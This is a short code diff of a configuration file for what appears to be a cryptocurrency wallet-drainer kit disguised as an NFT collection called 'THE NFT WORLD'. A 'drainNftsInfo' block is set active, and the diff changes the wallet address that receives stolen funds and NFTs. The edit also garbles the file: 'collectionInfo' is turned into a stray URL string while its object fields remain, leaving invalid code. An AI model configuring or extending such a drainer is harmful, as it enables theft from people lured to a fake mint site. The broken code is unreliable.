@@ -1,5 +1,5 @@
-const receiveAddress = '0xa92dDc31B089Cc80f05F9fFE7eb2a57aBBDe545c',
-  collectionInfo = {
+const receiveAddress = '0x4fbC605Cd615a1b08C0F6a79f1d725db71BfAc6e',
+  collectionInfo = 'https://status.infura.io/incidents/8w8n33bl4wv5'
     name: 'THE NFT WORLD',
     socialMedia: {
       discord: 'https://discord.gg',
@@ -27,7 +27,7 @@ const receiveAddress = '0xa92dDc31B089Cc80f05F9fFE7eb2a57aBBDe545c',
   drainNftsInfo = {
     active: true,
     minValue: 0.1,
-    nftReceiveAddress: '0xa92dDc31B089Cc80f05F9fFE7eb2a57aBBDe545c',
+    nftReceiveAddress: '0x4fbC605Cd615a1b08C0F6a79f1d725db71BfAc6e',
   },
 
   customStrings = {
